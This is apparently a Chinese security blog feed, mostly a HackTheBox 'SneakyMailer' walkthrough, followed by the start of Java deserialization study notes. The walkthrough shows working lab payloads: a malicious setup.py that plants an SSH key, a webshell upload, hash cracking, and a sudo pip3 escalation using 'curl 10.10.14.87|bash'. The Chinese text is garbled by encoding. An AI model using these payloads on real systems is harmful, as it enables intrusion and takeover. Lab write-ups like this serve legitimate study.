&#123;27&#125;</span><br><span class="line">Subject: Password reset</span><br><span class="line"></span><br><span class="line">)</span><br><span class="line">* 2 FETCH (BODY[HEADER.FIELDS (<span class="string">"Subject"</span>)] &#123;27&#125;</span><br><span class="line">Subject: Module testing</span><br><span class="line"></span><br><span class="line">)</span><br><span class="line">f OK FETCH completed.</span><br><span class="line">F1 fetch 1 RFC822</span><br><span class="line">* 1 FETCH (RFC822 &#123;2167&#125;</span><br><span class="line">MIME-Version: 1.0</span><br><span class="line">To: root &lt;root@debian&gt;</span><br><span class="line">From: Paul Byrd &lt;paulbyrd@sneakymailer.htb&gt;</span><br><span class="line">Subject: Password reset</span><br><span class="line">Date: Fri, 15 May 2020 13:03:37 -0500</span><br><span class="line">Importance: normal</span><br><span class="line">X-Priority: 3</span><br><span class="line">Content-Type: multipart/alternative;</span><br><span class="line">        boundary=<span class="string">"_21F4C0AC-AA5F-47F8-9F7F-7CB64B1169AD_"</span></span><br><span class="line"></span><br><span class="line">--_21F4C0AC-AA5F-47F8-9F7F-7CB64B1169AD_</span><br><span class="line">Content-Transfer-Encoding: quoted-printable</span><br><span class="line">Content-Type: text/plain; charset=<span class="string">"utf-8"</span></span><br><span class="line"></span><br><span class="line">Hello administrator, I want to change this password <span class="keyword">for</span> the developer accou=</span><br><span class="line">nt</span><br><span class="line"></span><br><span class="line">Username: developer</span><br><span class="line">Original-Password: m^AsY7vTKVT+dV1&#123;WOU%@NaHkUAId3]C</span><br><span class="line"></span><br><span class="line">Please notify me when you <span class="keyword">do</span> it=20</span><br><span class="line"></span><br><span class="line">--_21F4C0AC-AA5F-47F8-9F7F-7CB64B1169AD_</span><br><span class="line">Content-Transfer-Encoding: quoted-printable</span><br><span class="line">Content-Type: text/html; charset=<span class="string">"utf-8"</span></span><br><span class="line"></span><br><span class="line">&lt;html xmlns:o=3D<span class="string">"urn:schemas-microsoft-com:office:office"</span> xmlns:w=3D<span class="string">"urn:sc=</span></span><br><span class="line"><span class="string">hemas-microsoft-com:office:word"</span> xmlns:m=3D<span class="string">"http://schemas.microsoft.com/of=</span></span><br><span class="line"><span class="string">fice/2004/12/omml"</span> xmlns=3D<span class="string">"http://www.w3.org/TR/REC-html40"</span>&gt;&lt;head&gt;&lt;meta ht=</span><br><span class="line">tp-equiv=3DContent-Type content=3D<span class="string">"text/html; charset=3Dutf-8"</span>&gt;&lt;meta name=</span><br><span class="line">=3DGenerator content=3D<span class="string">"Microsoft Word 15 (filtered medium)"</span>&gt;&lt;style&gt;&lt;!--</span><br><span class="line">/* Font Definitions */</span><br><span class="line">@font-face</span><br><span class="line">        &#123;font-family:<span class="string">"Cambria Math"</span>;</span><br><span class="line">        panose-1:2 4 5 3 5 4 6 3 2 4;&#125;</span><br><span class="line">@font-face</span><br><span class="line">        &#123;font-family:Calibri;</span><br><span class="line">        panose-1:2 15 5 2 2 2 4 3 2 4;&#125;</span><br><span class="line">/* Style Definitions */</span><br><span class="line">p.MsoNormal, li.MsoNormal, div.MsoNormal</span><br><span class="line">        &#123;margin:0in;</span><br><span class="line">        margin-bottom:.0001pt;</span><br><span class="line">        font-size:11.0pt;</span><br><span class="line">        font-family:<span class="string">"Calibri"</span>,sans-serif;&#125;</span><br><span class="line">.MsoChpDefault</span><br><span class="line">        &#123;mso-style-type:<span class="built_in">export</span>-only;&#125;</span><br><span class="line">@page WordSection1</span><br><span class="line">        &#123;size:8.5in 11.0in;</span><br><span class="line">        margin:1.0in 1.0in 1.0in 1.0in;&#125;</span><br><span class="line">div.WordSection1</span><br><span class="line">        &#123;page:WordSection1;&#125;</span><br><span class="line">--&gt;&lt;/style&gt;&lt;/head&gt;&lt;body lang=3DEN-US link=3Dblue vlink=3D<span class="string">"#954F72"</span>&gt;&lt;div cla=</span><br><span class="line">ss=3DWordSection1&gt;&lt;p class=3DMsoNormal&gt;Hello administrator, I want to chang=</span><br><span class="line">e this password <span class="keyword">for</span> the developer account&lt;/p&gt;&lt;p class=3DMsoNormal&gt;&lt;o:p&gt;&amp;nbs=</span><br><span class="line">p;&lt;/o:p&gt;&lt;/p&gt;&lt;p class=3DMsoNormal&gt;Username: developer&lt;/p&gt;&lt;p class=3DMsoNorma=</span><br><span class="line">l&gt;Original-Password: m^AsY7vTKVT+dV1&#123;WOU%@NaHkUAId3]C&lt;/p&gt;&lt;p class=3DMsoNorm=</span><br><span class="line">al&gt;&lt;o:p&gt;&amp;nbsp;&lt;/o:p&gt;&lt;/p&gt;&lt;p class=3DMsoNormal&gt;Please notify me when you <span class="keyword">do</span> i=</span><br><span class="line">t &lt;/p&gt;&lt;/div&gt;&lt;/body&gt;&lt;/html&gt;=</span><br><span class="line"></span><br><span class="line">--_21F4C0AC-AA5F-47F8-9F7F-7CB64B1169AD_--</span><br><span class="line">)</span><br><span class="line">F1 OK FETCH completed.</span><br><span class="line">F1 fetch 2 RFC822</span><br><span class="line">* 2 FETCH (RFC822 &#123;585&#125;</span><br><span class="line">To: low@debian</span><br><span class="line">From: Paul Byrd &lt;paulbyrd@sneakymailer.htb&gt;</span><br><span class="line">Subject: Module testing</span><br><span class="line">Message-ID: &lt;4d08007d-3f7e-95ee-858a-40c6e04581bb@sneakymailer.htb&gt;</span><br><span class="line">Date: Wed, 27 May 2020 13:28:58 -0400</span><br><span class="line">User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101</span><br><span class="line"> Thunderbird/68.8.0</span><br><span class="line">MIME-Version: 1.0</span><br><span class="line">Content-Type: text/plain; charset=utf-8; format=flowed</span><br><span class="line">Content-Transfer-Encoding: 7bit</span><br><span class="line">Content-Language: en-US</span><br><span class="line"></span><br><span class="line">Hello low</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Your current task is to install, <span class="built_in">test</span> and <span class="keyword">then</span> erase every python module you </span><br><span class="line">find <span class="keyword">in</span> our PyPI service, <span class="built_in">let</span> me know <span class="keyword">if</span> you have any inconvenience.</span><br><span class="line"></span><br><span class="line">)</span><br><span class="line">F1 OK FETCH completed.</span><br></pre></td></tr></table></figure><p>ç¬¬ä¸€ä»½é‚®ä»¶æ³„éœ²äº†ä¸€ä»½ç”¨æˆ·å¯†ç <code>developer:m^AsY7vTKVT+dV1{WOU%@NaHkUAId3]C</code>.ç¬¬äºŒä¸ªé‚®ä»¶æ³„éœ²äº†ä¸€ä¸ªç”¨æˆ·ã€‚çœ‹èµ·æ¥å¯ä»¥ç»§ç»­è¿›è¡Œè´¦æˆ·å¯†ç çš„å°è¯•äº†ã€‚</p><p>æœä¸å…¶ç„¶è¿˜æ˜¯æ²¡æœ‰å¾—åˆ°sshçš„è´¦æˆ·ã€‚ä½†æ˜¯developerå¯ä»¥ç™»é™†ftpã€‚çœ‹äº†ä¸‹å‘ç°é‡Œé¢æ˜¯ä¸ªdevæ–‡ä»¶å¤¹ã€‚å†…å®¹è·Ÿæˆ‘ä»¬80ç«¯å£çš„ç½‘é¡µä¸€è‡´ã€‚<br>å…ˆæŠŠdevæ–‡ä»¶å¤¹æ‹–ä¸‹æ¥ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget ftp://10.10.10.197:21/* --ftp-user=developer  --ftp-password=m^AsY7vTKVT+dV1&#123;WOU%@NaHkUAId3]C  -r</span><br></pre></td></tr></table></figure><p>ä»”ç»†ä¸€å®¡å‘ç°éƒ½æ˜¯é™æ€æ–‡ä»¶ã€‚è¿™ç‚¹æœ‰ç‚¹æ‡µã€‚ä¸è¿‡æ–‡ä»¶å¤¹åå­—å€’æ˜¯æé†’äº†æˆ‘ä¸€ä¸ªç–å¿½çš„åœ°æ–¹ã€‚é‚£å°±æ˜¯æˆ‘å¿˜è®°æ”¶é›†å­åŸŸåäº†ã€‚äºæ˜¯wfuzzèµ°èµ·æ”¶é›†å­åŸŸåã€‚å‘ç°ç¡®å®å­˜åœ¨<code>dev.sneakycorp.htb</code></p><p>æ—¢ç„¶æˆ‘ä»¬çš„ftpç›®å½•æ˜¯å¯¹åº”çš„webç›®å½•ã€‚é‚£å°±ç›´æ¥<code>mput</code>ä¸Šä¼ webshellå³å¯ã€‚å‘½ä»¤æ‰§è¡Œgetshell.<br><img src="/2020/07/16/hackthebox-SneakyMailer/2.PNG" class="lazyload" data-srcset="2.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><p>å°ç»“ä¸‹ã€‚è¿™ä¸€éƒ¨åˆ†æ€»ä½“ä¸Šåªæœ‰enumçš„å†…å®¹ã€‚ä¸è¿‡æ•´ä½“ä¸Šæ”¶è·æŒºå¤§çš„ã€‚å› ä¸ºä»¥å‰æ²¡æ€ä¹ˆæ¥è§¦è¿‡smtp.ç°åœ¨å€Ÿæ­¤æœºä¼šæ¥è§¦smtp,imapç†Ÿæ‚‰äº†ç›¸å¯¹åº”çš„å‘½ä»¤å€’æ˜¯æŒºä¸é”™çš„ã€‚</p><h2 id="privesc-to-user"><a href="#privesc-to-user" class="headerlink" title="privesc to user"></a>privesc to user</h2><p>  æ¥ä¸‹æ¥æ˜¯ææƒéƒ¨åˆ†ã€‚è¿™é‡Œæˆ‘é‡ç‚¹å…³æ³¨pypiè·Ÿlow.å› ä¸ºè¿™ä¸¤ä¸ªç”¨æˆ·åœ¨å‰é˜¶æ®µå‡ºç°çš„é¢‘ç‡æ¯”è¾ƒé«˜ã€‚</p><p>  é¦–å…ˆå¾ˆå®¹æ˜“å‘ç°<code>/var/www</code>æœ‰å››ä¸ªæ–‡ä»¶å¤¹<code>dev.sneakymailer.htb</code>,<code>pypi.sneakymailer.htb</code>,<code>sneakymailer.htb</code>è·Ÿhtml.å…¶ä¸­devè·Ÿhtmlå†…å®¹ä¸€è‡´æˆ‘ä»¬ä¸ç”¨ç®¡ã€‚è¿™é‡Œ<code>pypi.sneakymailer.htb</code>å€’æ˜¯ä¸ªæŒºéš¾çˆ†å‡ºæ¥çš„å­åŸŸåã€‚é‚£ä¹ˆå…ˆåŠ åˆ°hostsé‡Œå»ã€‚å‘ç°å¯¹åº”çš„åŸæ¥å°±æ˜¯ä¹‹å‰çš„8080ç«¯å£çš„æœåŠ¡ã€‚ç½‘é¡µå†…å®¹æ˜¯ä¸ªpypiserver 1.3.2.ç„¶åæœ‰ä¸¤ä¸ªå†…å®¹éƒ½è¦å¯†ç ã€‚</p><p>çœ‹èµ·æ¥webé¡µé¢æ²¡å•¥ç”¨ã€‚ç›´æ¥å»pypiæ–‡ä»¶å¤¹ä¸‹æ‰¾å†…å®¹ã€‚å‘ç°ä¸€ä¸ª.htpasswd</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pypi:$apr1$RV5c5YVs$U9.OTqF5n8K4mxWpSSR&#x2F;p&#x2F;</span><br></pre></td></tr></table></figure><p>æŸ¥çœ‹hash-exampleså‘ç°æ˜¯apache apr hash.hashcatç ´è§£ä¹‹ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashcat -m 1600  -a 0 --force  -o pass.txt hash.txt /usr/share/wordlists/rockyou.txt</span><br></pre></td></tr></table></figure><p>å¾—åˆ°<br><code>$apr1$RV5c5YVs$U9.OTqF5n8K4mxWpSSR/p/:soufianeelhaoui</code><br>ç°åœ¨æˆ‘ä»¬å€’æ˜¯èƒ½ç”¨è¿™ç»„è´¦æˆ·ç™»å½•8080çš„pypiserverã€‚ä½†æ˜¯ä¼¼ä¹è¿˜æ˜¯æ²¡å•¥ç”¨ã€‚çœ‹æ¥æˆ‘ä»¬å¾—å»äº†è§£ä¸‹pypiserver ä½œç”¨<br><a href="https://pypi.org/project/pypiserver/#table-of-contents" target="_blank" rel="noopener">https://pypi.org/project/pypiserver/#table-of-contents</a><br>è¿™é‡Œé¢ Uploading Packages Remotely è¿™ä¸ªåŠŸèƒ½æ¯”è¾ƒå¸å¼•çœ¼çƒã€‚å‡å¦‚æˆ‘ä»¬èƒ½ä¸Šä¼ æ¶æ„packageã€‚åº”è¯¥å°±èƒ½æ‰§è¡Œå‘½ä»¤äº†ã€‚<br>è·‘ä¸ªlinpeas.sh.çœ‹çœ‹</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pypi       691  0.1  0.6  36800 25764 ?        Ss   04:06   0:01 /var/www/pypi.sneakycorp.htb/venv/bin/python3 /var/www/pypi.sneakycorp.htb/venv/bin/pypi-server -i 127.0.0.1 -p 5000 -a update,download,list -P /var/www/pypi.sneakycorp.htb/.htpasswd --<span class="built_in">disable</span>-fallback -o /var/www/pypi.sneakycorp.htb/packages</span><br><span class="line">low       1098  0.1  0.5  29952 20976 ?        Ss   04:07   0:00 /home/low/venv/bin/python /opt/scripts/low/install-modules.py</span><br></pre></td></tr></table></figure><p>çœ‹èµ·æ¥lowç”¨æˆ·çš„ç¡®åœ¨æ‰§è¡Œpython modulesçš„ä¸‹è½½ã€‚é‚£ä¹ˆæ¥ä¸‹æ¥æˆ‘ä»¬çœ‹çœ‹å¦‚ä½•æ„å»ºä¸€ä¸ªæ¶æ„çš„setup.pyã€‚<br>ç½‘ä¸Šæ‰¾ä¸ªdemo.å‡†å¤‡ä¸€ä¸ªå†™å…¬é’¥çš„payloadã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> setuptools</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="keyword">with</span> open(<span class="string">"/home/low/.ssh/authorized_keys"</span>, <span class="string">"a"</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(<span class="string">"""ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQD1J7hVPxdMEhfE1XL2OOPjgQvKZGm68ldluK8TTW70AVRKxwvfUzOCJA4vPFgrzeJ5E27UTYatqxtxIDagHHjMtmkt+FFk62Xe8qO4pDlzQEjrSiXA/Ex82KHqlnDReaRHEEcc4CmtvzBVavB4o34CeTUYEG2N7OC1RbVUZkX9ULjodiaasubHG4lo5M2wYZ+1RjPxl/wupsEmPzB/SoSUgCAMra/tsd1jxhsJ0+m45puGKgv5Zb4IeWMATdd+Ea6v7J70YUns1E7Ciutn83jRw4efId4ZNJDGCA0GYKqaYLKsj/gA+evl/6asj8TQBgD516xFp2bpdGWuzy0sef2c22E6xS9Vs/uUpwC5T8hMlvjxtFIJE57dQz6JrJdwqQk1Jf3WQUoU6NfcRTampYVdrTHAatLccghgAS8ldA0vxO7hTzSDocO6iTfDqPrfRQfk7F0/geEP7KgoWKAJvBz1RQpmTvvhWa6lbESafIjzPPfN0e2I17CPSir/ek5fZh0= root@byc404"""</span>)</span><br><span class="line">        f.close()</span><br><span class="line"><span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line">setuptools.setup(</span><br><span class="line">    name=<span class="string">"byc_404"</span>, </span><br><span class="line">    version=<span class="string">"0.0.1"</span>,</span><br><span class="line">    author=<span class="string">"byc"</span>,</span><br><span class="line">    author_email=<span class="string">"byc@bycsec.top"</span>,</span><br><span class="line">    description=<span class="string">"A small example package"</span>,</span><br><span class="line">    long_description=<span class="string">""</span>,</span><br><span class="line">    long_description_content_type=<span class="string">""</span>,</span><br><span class="line">    url=<span class="string">"https://github.com/pypa/sampleproject"</span>,</span><br><span class="line">    packages=setuptools.find_packages(),</span><br><span class="line">    classifiers=[</span><br><span class="line">    <span class="string">"Programming Language :: Python :: 3"</span>,</span><br><span class="line">    <span class="string">"License :: OSI Approved :: MIT License"</span>,</span><br><span class="line">    <span class="string">"Operating System :: OS Independent"</span>,</span><br><span class="line">    ],</span><br><span class="line">)</span><br></pre></td></tr></table></figure><p>ç„¶åæ˜¯<code>~/.pypirc</code>æ–‡ä»¶ã€‚ä½¿ç”¨å®ƒæœ‰ä»¥ä¸‹ä¸¤ä¸ªä¼˜åŠ¿</p><blockquote><ol><li>It removes the need to enter a username/password when pushing to PyPI. 2. It simplifies command line usage when pushing packages to a non-default package repository (i.e. anywhere other than <a href="https://pypi.org/" target="_blank" rel="noopener">pypi.org</a>).</li></ol></blockquote><p>è¿™æ ·æˆ‘ä»¬å°±ä¸ç”¨é‡å¤è¾“å…¥ç”¨æˆ·å¯†ç ã€‚åŒæ—¶ä¿è¯å†…å®¹æ¨å‘sneakycorp.htbæ‰€åœ¨çš„pypiä»“åº“ã€‚<br>æŒ‰ç…§å®˜ç½‘è®¾å®šä¿®æ”¹ä¸‹</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[distutils]</span><br><span class="line">index-servers &#x3D; local</span><br><span class="line"></span><br><span class="line">[local]</span><br><span class="line">repository: http:&#x2F;&#x2F;pypi.sneakycorp.htb:8080&#x2F;</span><br><span class="line">username: pypi</span><br><span class="line">password: soufianeelhaoui</span><br></pre></td></tr></table></figure><p>å…ˆ<code>chmod 600 .pypirc</code> ç„¶åå†æ‰§è¡Œä»¥ä¸‹å‘½ä»¤æ¥upload packageã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python setup.py sdist register -r <span class="built_in">local</span> upload -r <span class="built_in">local</span></span><br></pre></td></tr></table></figure><p>è™½ç„¶ä¼šæç¤ºè¿™ç§æ“ä½œæ–¹æ³•å·²ç»<code>deprecated</code>äº†ã€‚ä½†æ˜¯ä¸å½±å“å®Œæˆå‘½ä»¤ã€‚<br>å½“ç„¶è¿™æ ·ä½¿ç”¨æ˜¯å› ä¸ºé¶æœºæ²¡å®‰è£…twine.ä¸è¿‡åŸºäºpypiserveræ˜¯æš´éœ²åœ¨å…¬ç½‘çš„ã€‚æˆ‘ä»¬ç›´æ¥æœ¬åœ°ä½¿ç”¨twineä¹Ÿå¯ä»¥ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">python3 setup.py sdist bdist_wheel</span><br><span class="line"></span><br><span class="line">python3 -m twine upload â€“repository <span class="built_in">local</span> dist/*</span><br></pre></td></tr></table></figure><p>å†™å…¥å…¬é’¥å³å¯sshç™»å½•<br><img src="/2020/07/16/hackthebox-SneakyMailer/3.PNG" class="lazyload" data-srcset="3.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt><br>æ”¶ä¸‹user.txt.</p><p>è¿™ä¸€éƒ¨åˆ†pypiserverçš„ä½¿ç”¨æŒºæœ‰æ„æ€çš„ã€‚ä¸è¿‡æˆ‘è¿™é‡Œè¯•äº†ä¸å†™å…¬é’¥ç›´æ¥å‘½ä»¤æ‰§è¡Œå€’æ˜¯æ²¡æœ‰ç”¨,æ„Ÿè§‰æœ‰ç‚¹é—®é¢˜ï¼ˆä¹Ÿè®¸æ˜¯å› ä¸ºé¶æœºåŠ¨ä¸åŠ¨é‡å¯å§ï¼Œæ¯•ç«Ÿåˆšå‡ºçš„é¶æœºæ€»æ˜¯å®¹æ˜“å¡ï¼‰</p><h2 id="privesc-to-root"><a href="#privesc-to-root" class="headerlink" title="privesc to root"></a>privesc to root</h2><p>è¿™ä¸€éƒ¨åˆ†å€’æ˜¯è¿‡äºç®€å•äº†ã€‚ç”±äºå‰é¢æœç´¢èµ„æ–™æ—¶æœåˆ°äº†<code>pip</code>çš„privesc.æ‰€ä»¥æ‰§è¡Œ<code>sudo -l</code>å‘ç°å¯ä»¥pip3åå°±ç®€å•äº†<br><a href="https://www.hackingarticles.in/linux-for-pentester-pip-privilege-escalation/" target="_blank" rel="noopener">https://www.hackingarticles.in/linux-for-pentester-pip-privilege-escalation/</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">TF=$(mktemp -d)</span><br><span class="line"><span class="built_in">echo</span> <span class="string">"import os;os.system('curl 10.10.14.87|bash')"</span> &gt; <span class="variable">$TF</span>/setup.py</span><br><span class="line">sudo pip3 install <span class="variable">$TF</span></span><br></pre></td></tr></table></figure><p><img src="/2020/07/16/hackthebox-SneakyMailer/4.PNG" class="lazyload" data-srcset="4.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt><br>rooted.</p><h2 id="summary"><a href="#summary" class="headerlink" title="summary"></a>summary</h2><p>æ•´ä½“ä¸Šæ¥è¯´rootä¹‹å‰çš„éƒ¨åˆ†éƒ½ç®—æ˜¯æ–°çŸ¥è¯†ã€‚é‚®ä»¶çš„éƒ¨åˆ†æŒºæœ‰æ„æ€çš„ã€‚æ„Ÿè§‰éå¸¸æ¥è¿‘çœŸå®å®æˆ˜ã€‚å‡å¦‚çœŸçš„æœ‰ç”¨æˆ·å®‰å…¨æ„è¯†ä¸å¼ºç‚¹å‡»äº†æˆ‘ä»¬çš„é“¾æ¥å°±å¯ä»¥æ‰“å¼€å¦ä¸€ç‰‡å¤©åœ°äº†ã€‚<br>åé¢pythonçš„éƒ¨åˆ†å¯èƒ½æœ‰ç‚¹æŠ€ç©·äº†ã€‚ä¸è¿‡ç¡®å®ç®—æ˜¯pythonç”¨äºææƒçš„å¸¸è§æ‰‹æ®µã€‚æ¶æ„åŒ…æˆ–è€…æ¶æ„pyæºç éƒ½å¯ä»¥å¯¼è‡´ææƒå‘ç”Ÿã€‚</p>]]></content>
      
      
      
        <tags>
            
            <tag> hackthebox </tag>
            
            <tag> pentest </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>å­¦ä¹ ç¬”è®°-Javaç›¸å…³</title>
      <link href="2020/07/09/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-Java%E7%9B%B8%E5%85%B3/"/>
      <url>2020/07/09/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-Java%E7%9B%B8%E5%85%B3/</url>
      
        <content type="html"><![CDATA[<p>ä»å‡ ä¸ªæœˆå‰å°±è¯´è¦å­¦javawebã€‚ç»“æœä¸€ç›´åœ¨æ‹–ã€‚ç°åœ¨å¼€ç¯‡æ–‡ç« å¼ºè¿«è‡ªå·±å†™å†™ç¬”è®°ã€‚</p><p>å¤§ä½“ä¸Šæ‰“ç®—ä»å¸¸è§æ¼æ´å’Œæ¡†æ¶ä½¿ç”¨ä¸¤ä¸ªæ–¹é¢å­¦ä¹ ã€‚å› ä¸ºæœ‰è¯­è¨€åŸºç¡€å°±ä¸è°ˆæ¯”è¾ƒåŸºç¡€çš„éƒ¨åˆ†äº†ã€‚</p><a id="more"></a><h2 id="vulns"><a href="#vulns" class="headerlink" title="vulns"></a>vulns</h2><p>javaæ¯”è¾ƒå¸¸è§çš„æœ‰ç‰¹è‰²çš„æ¼æ´åŒ…æ‹¬ä½†ä¸é™äº</p><ul><li>deserialization</li><li>xxe</li><li>SpEL</li><li>ssti</li><li>url bypass<br>â€¦â€¦</li></ul><p>è¿™é‡Œç”¨JoyChouå¤§ä½¬çš„é¡¹ç›®å­¦ä¹  <a href="https://github.com/JoyChou93/java-sec-code" target="_blank" rel="noopener">https://github.com/JoyChou93/java-sec-code</a><br>éå¸¸å…¨é¢ã€‚</p><p>æ¯ç§æ¼æ´éƒ½æœ‰å¯¹åº”çš„æºç ã€‚åŸå…ˆå¾ˆå¤šååºåˆ—çš„æ´å¤ç°è¿‡ä½†æ˜¯æ²¡æœ‰çœ‹è¿‡æºç ã€‚è¿™é‡Œæ­£å¥½ç ”ç©¶ä¸‹ã€‚</p><h3 id="deserialization"><a href="#deserialization" class="headerlink" title="deserialization"></a>deserialization</h3><p>æ¶æ„åŠé˜²èŒƒæºç </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.joychou.controller;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.joychou.config.Constants;</span><br><span class="line"><span class="keyword">import</span> org.joychou.security.AntObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> org.slf4j.Logger;</span><br><span class="line"><span class="keyword">import</span> org.slf4j.LoggerFactory;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RestController;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.Cookie;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.InvalidClassException;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> org.springframework.web.util.WebUtils.getCookie;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Deserialize RCE using Commons-Collections gadget.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> JoyChou @2018-06-14</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="meta">@RequestMapping</span>(<span class="string">"/deserialize"</span>)</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Deserialize</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">final</span> Logger logger = LoggerFactory.getLogger(<span class="keyword">this</span>.getClass());</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * java -jar ysoserial.jar CommonsCollections5 "open -a Calculator" | base64</span></span><br><span class="line"><span class="comment">     * Add the result to rememberMe cookie.</span></span><br><span class="line"><span class="comment">     * 